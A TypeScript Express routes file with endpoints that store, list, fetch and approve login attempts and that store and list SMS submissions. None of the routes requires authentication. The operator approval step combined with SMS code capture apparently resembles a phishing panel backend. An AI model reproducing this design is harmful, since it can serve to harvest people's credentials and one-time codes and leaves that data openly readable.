import type { Express } from "express";
import { createServer, type Server } from "http";
import { storage } from "./storage";
import { insertLoginAttemptSchema, insertSmsSubmissionSchema } from "@shared/schema";

export async function registerRoutes(app: Express): Promise<Server> {
  // Create login attempt
  app.post("/api/login-attempts", async (req, res) => {
    try {
      const validatedData = insertLoginAttemptSchema.parse(req.body);
      const loginAttempt = await storage.createLoginAttempt(validatedData);
      res.json(loginAttempt);
    } catch (error) {
      res.status(400).json({ error: "Invalid data" });
    }
  });

  // Get all login attempts
  app.get("/api/login-attempts", async (req, res) => {
    try {
      const attempts = await storage.getLoginAttempts();
      res.json(attempts);
    } catch (error) {
      res.status(500).json({ error: "Failed to fetch login attempts" });
    }
  });

  // Approve login attempt
  app.post("/api/login-attempts/:id/approve", async (req, res) => {
    try {
      const id = parseInt(req.params.id);
      await storage.approveLoginAttempt(id);
      res.json({ success: true });
    } catch (error) {
      res.status(500).json({ error: "Failed to approve login attempt" });
    }
  });

  // Get single login attempt
  app.get("/api/login-attempts/:id", async (req, res) => {
    try {
      const id = parseInt(req.params.id);
      const attempt = await storage.getLoginAttempt(id);
      if (!attempt) {
        return res.status(404).json({ error: "Login attempt not found" });
      }
      res.json(attempt);
    } catch (error) {
      res.status(500).json({ error: "Failed to fetch login attempt" });
    }
  });

  // Create SMS submission
  app.post("/api/sms-submissions", async (req, res) => {
    try {
      const validatedData = insertSmsSubmissionSchema.parse(req.body);
      const smsSubmission = await storage.createSmsSubmission(validatedData);
      res.json(smsSubmission);
    } catch (error) {
      res.status(400).json({ error: "Invalid data" });
    }
  });

  // Get all SMS submissions
  app.get("/api/sms-submissions", async (req, res) => {
    try {
      const submissions = await storage.getSmsSubmissions();
      res.json(submissions);
    } catch (error) {
      res.status(500).json({ error: "Failed to fetch SMS submissions" });
    }
  });

  const httpServer = createServer(app);

  return httpServer;
}
